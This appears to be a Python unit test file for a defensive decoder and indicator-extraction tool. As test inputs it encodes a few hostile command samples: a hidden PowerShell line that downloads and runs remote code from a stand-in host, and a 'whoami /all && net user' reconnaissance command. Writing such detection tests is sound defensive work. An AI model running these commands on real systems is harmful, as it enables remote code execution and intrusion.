import base64
import gzip
import json
import os
import sys
import unittest
import zlib
from unittest import mock
from urllib.parse import quote

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from cyberdecoder import engine, ioc, report  # noqa: E402


def b64(s: bytes | str) -> str:
    return base64.b64encode(s.encode() if isinstance(s, str) else s).decode()


def methods(a):
    return [l.method for l in a.layers]


class SingleLayer(unittest.TestCase):
    def test_base64(self):
        a = engine.analyze(b"SGVsbG8gV29ybGQ=")
        self.assertEqual(methods(a), ["Base64"])
        self.assertEqual(a.final, b"Hello World")
        self.assertGreaterEqual(a.layers[0].confidence, 70)

    def test_base64_no_padding_and_urlsafe(self):
        a = engine.analyze(b64("Hello World, this is a test!").rstrip("=").encode())
        self.assertEqual(a.final, b"Hello World, this is a test!")
        text = b"what?>>??>>? is going on here???>>> ok"
        enc = base64.urlsafe_b64encode(text)
        self.assertTrue(b"-" in enc or b"_" in enc)
        a = engine.analyze(enc)
        self.assertEqual(a.final, text)
        self.assertTrue(any("URL-safe" in n for n in a.layers[0].notes))

    def test_base64_wrapped_lines(self):
        txt = b64("A" * 120 + " some readable text here to make it long enough")
        wrapped = "\n".join(txt[i:i + 64] for i in range(0, len(txt), 64))
        a = engine.analyze(wrapped.encode())
        self.assertTrue(a.final.startswith(b"AAAA"))

    def test_hex_variants(self):
        for src in ["48656c6c6f20576f726c64", "48 65 6c 6c 6f 20 57 6f 72 6c 64",
                    "0x48,0x65,0x6c,0x6c,0x6f,0x20,0x57,0x6f", "\\x48\\x65\\x6c\\x6c\\x6f\\x20\\x57\\x6f"]:
            a = engine.analyze(src.encode())
            self.assertEqual(methods(a), ["Hex"], src)
            self.assertTrue(a.final.startswith(b"Hello"), src)

    def test_url_decoding(self):
        a = engine.analyze(quote("https://evil.com/a?b=c d", safe="").encode())
        self.assertEqual(methods(a), ["URL Encoding"])
        self.assertEqual(a.final, b"https://evil.com/a?b=c d")
        self.assertEqual(a.final_type, "Text")

    def test_unicode_escapes(self):
        a = engine.analyze(b"\\u0048\\u0065\\u006c\\u006c\\u006f \\ud83d\\ude00 \\u0645\\u0631\\u062d\\u0628\\u0627")
        self.assertEqual(methods(a), ["Unicode Escapes"])
        self.assertEqual(a.final.decode(), "Hello \U0001F600 مرحبا")

    def test_html_entities(self):
        a = engine.analyze(b"&lt;script&gt;alert(1)&lt;/script&gt; &amp; more")
        self.assertIn("HTML Entities", methods(a))
        self.assertIn(b"<script>", a.final)

    def test_base32(self):
        a = engine.analyze(base64.b32encode(b"attack at dawn, bring snacks"))
        self.assertEqual(methods(a), ["Base32"])

    def test_json_detect_and_type(self):
        a = engine.analyze(b'{"a": 1, "b": [1,2,3]}')
        self.assertEqual(methods(a), ["JSON"])
        self.assertEqual(a.final_type, "JSON")

    def test_jwt(self):
        def seg(o):
            return base64.urlsafe_b64encode(json.dumps(o).encode()).rstrip(b"=").decode()
        tok = f"{seg({'alg': 'HS256', 'typ': 'JWT'})}.{seg({'sub': 'ali', 'exp': 1000000000})}.c2lnbmF0dXJl"
        a = engine.analyze(tok.encode())
        self.assertEqual(methods(a), ["JWT"])
        self.assertEqual(a.final_type, "JSON")
        self.assertTrue(any("منتهي" in n for n in a.layers[0].notes))
        self.assertEqual(json.loads(a.final)["payload"]["sub"], "ali")

    def test_gzip_and_zlib(self):
        a = engine.analyze(gzip.compress(b"hello gzip world " * 5))
        self.assertEqual(methods(a), ["Gzip"])
        a = engine.analyze(zlib.compress(b"hello zlib world " * 5))
        self.assertEqual(methods(a), ["Zlib"])

    def test_powershell_utf16_base64(self):
        cmd = "Write-Host 'hello from powershell'"
        a = engine.analyze(b64(cmd.encode("utf-16-le")).encode())
        self.assertEqual(a.final.decode(), cmd)
        self.assertTrue(any("UTF-16" in n for n in a.layers[0].notes))


class MultiLayer(unittest.TestCase):
    def test_nested_chain(self):
        payload = "http://evil-domain.com/payload.ps1 and 10.20.30.40"
        data = b64(gzip.compress(quote(b64(payload), safe="").encode()))
        a = engine.analyze(data.encode())
        self.assertEqual(methods(a), ["Base64", "Gzip", "URL Encoding", "Base64"][:len(a.layers)])
        self.assertEqual(a.final.decode(), payload)
        self.assertEqual(a.decode_layer_count, 4)

    def test_depth_limit(self):
        s = "secret message that is fairly long"
        for _ in range(15):
            s = b64(s)
        a = engine.analyze(s.encode(), max_depth=5)
        self.assertEqual(len(a.layers), 5)
        self.assertEqual(a.stop_reason, "max_depth")
        a2 = engine.analyze(s.encode(), max_depth=30)
        self.assertEqual(a2.final, b"secret message that is fairly long")
        self.assertEqual(a2.stop_reason, "done")

    def test_loop_detection(self):
        state = {"flip": False}

        def flipper(data, text):
            if text is None:
                return None
            return engine.Detection("Flip", 99, (b"BBBBBBBBBB" if data.startswith(b"AAAA") else b"AAAAAAAAAA"))

        with mock.patch.object(engine, "DETECTORS", [flipper]):
            a = engine.analyze(b"AAAAAAAAAA", max_depth=20)
        self.assertEqual(a.stop_reason, "loop")
        self.assertTrue(any("حلقة" in w for w in a.warnings))

    def test_zip_bomb_is_capped(self):
        with mock.patch.object(engine, "MAX_OUTPUT", 1000):
            a = engine.analyze(gzip.compress(b"\x00" * 50000))
        self.assertLessEqual(len(a.layers[0].data), 1000)
        self.assertTrue(any("اقتطاع" in n for n in a.layers[0].notes))


class FalsePositives(unittest.TestCase):
    def test_plain_words_untouched(self):
        for s in ["password", "Administrator", "hello world", "test", "12345678", "2024-01-15",
                  "00:1A:2B:3C:4D:5E", "550e8400-e29b-41d4-a716-446655440000",
                  "d41d8cd98f00b204e9800998ecf8427e", "The quick brown fox jumps over the lazy dog.",
                  "C:\\Users\\Public\\Documents\\report.docx", "internationalization"]:
            a = engine.analyze(s.encode())
            self.assertEqual(a.layers, [], f"false positive on {s!r}: {methods(a)}")

    def test_empty(self):
        a = engine.analyze(b"")
        self.assertEqual(a.final_type, "Empty")

    def test_weak_binary_base64_is_only_a_hint(self):
        a = engine.analyze(b64(os_random(48)).encode())
        self.assertEqual(a.layers, [])
        self.assertTrue(a.hints)


def os_random(n):
    import random
    r = random.Random(7)
    return bytes(r.randrange(128, 256) for _ in range(n))


class Embedded(unittest.TestCase):
    def test_log_line(self):
        line = f"2026-01-05 host=srv1 cmd={b64('whoami /all && net user')} src=10.0.0.5 ok"
        a = engine.analyze(line.encode())
        self.assertEqual(a.layers, [])
        self.assertEqual(len(a.embedded), 1)
        self.assertIn(b"whoami", a.embedded[0].analysis.final)

    def test_iocs_from_embedded_are_merged(self):
        line = f"alert data={b64('beacon to http://bad.example.net/x from 8.8.4.4')}"
        a = engine.analyze(line.encode())
        vals = {v for v, _ in a.iocs.get("ipv4", [])}
        self.assertIn("8.8.4.4", vals)
        self.assertTrue(any("bad.example.net" in v for v, _ in a.iocs["domain"]))

    def test_json_with_base64_value(self):
        doc = json.dumps({"user": "x", "blob": b64("connect to 172.16.5.9 now please")})
        a = engine.analyze(doc.encode())
        self.assertEqual(a.final_type, "JSON")
        self.assertEqual(len(a.embedded), 1)
        self.assertIn("172.16.5.9", {v for v, _ in a.iocs["ipv4"]})


class IOC(unittest.TestCase):
    def test_extract_all(self):
        text = (
            "GET http://evil-site.com/a.php?x=1, https://1.2.3.4:8080/p. Contact bob@corp.org "
            "C:\\Windows\\System32\\cmd.exe /c whoami and C:\\Program Files\\App\\run.exe; "
            "\\\\srv\\share\\file.txt HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\x "
            "hash d41d8cd98f00b204e9800998ecf8427e www.google.com run.exe script.py 999.1.1.1 v1.2.3.4-beta"
        )
        r = ioc.extract(text)
        self.assertIn("http://evil-site.com/a.php?x=1", r["url"])
        self.assertIn("https://1.2.3.4:8080/p", r["url"])
        self.assertIn("evil-site.com", r["domain"])
        self.assertIn("www.google.com", r["domain"])
        self.assertIn("corp.org", r["domain"])
        self.assertNotIn("run.exe", r["domain"])
        self.assertNotIn("script.py", r["domain"])
        self.assertIn("1.2.3.4", r["ipv4"])
        self.assertNotIn("999.1.1.1", r["ipv4"])
        self.assertEqual(r["ipv4"].count("1.2.3.4"), 1)
        self.assertIn("bob@corp.org", r["email"])
        self.assertIn("C:\\Windows\\System32\\cmd.exe", r["path"])
        self.assertIn("C:\\Program Files\\App\\run.exe", r["path"])
        self.assertIn("\\\\srv\\share\\file.txt", r["path"])
        self.assertTrue(any(p.startswith("HKLM") for p in r["registry"]))
        self.assertIn("d41d8cd98f00b204e9800998ecf8427e", r["hash"])

    def test_refang(self):
        r = ioc.extract("hxxps://bad[.]example[.]com/login and 1[.]2[.]3[.]4 user[@]evil[.]org")
        self.assertIn("https://bad.example.com/login", r["url"])
        self.assertIn("1.2.3.4", r["ipv4"])
        self.assertIn("user@evil.org", r["email"])

    def test_json_paths_are_unescaped(self):
        doc = json.dumps({"p": "C:\\Users\\Public\\evil.exe"})
        a = engine.analyze(doc.encode())
        self.assertIn("C:\\Users\\Public\\evil.exe", [v for v, _ in a.iocs["path"]])


class Findings(unittest.TestCase):
    def test_powershell_downloader(self):
        cmd = "powershell -nop -w hidden -enc AAAA; IEX (New-Object Net.WebClient).DownloadString('http://x.io/a')"
        a = engine.analyze(b64(cmd).encode())
        titles = " | ".join(f.title for f in a.findings)
        self.assertIn("IEX", titles)
        self.assertIn("تنزيل", titles)
        self.assertEqual(a.findings[0].level, "high")

    def test_pe_binary(self):
        pe = bytearray(b"MZ" + b"\x90" * 62 + b"\x00" * 64)
        pe[0x3C:0x40] = (64).to_bytes(4, "little")
        pe[64:68] = b"PE\x00\x00"
        a = engine.analyze(b64(bytes(pe)).encode())
        self.assertEqual(a.final_type, "Binary")
        self.assertIn("PE", a.final_detail)
        self.assertTrue(any("PE" in f.title for f in a.findings))


class Reports(unittest.TestCase):
    def setUp(self):
        self.a = engine.analyze(b64("visit http://evil.example.org now from 5.6.7.8").encode())

    def test_text_report(self):
        t = report.build_text_report(self.a)
        for needle in ("Base64", "evil.example.org", "5.6.7.8", "SHA-256", "الملخص"):
            self.assertIn(needle, t)

    def test_json_report_roundtrip(self):
        j = json.loads(json.dumps(report.build_json_report(self.a), ensure_ascii=False))
        self.assertEqual(j["layers"][0]["method"], "Base64")
        self.assertIn("5.6.7.8", [x["value"] for x in j["iocs"]["ipv4"]])

    def test_hexdump(self):
        self.assertTrue(report.hexdump(b"ABC\x00").startswith("00000000  41 42 43 00"))


if __name__ == "__main__":
    unittest.main(verbosity=2)
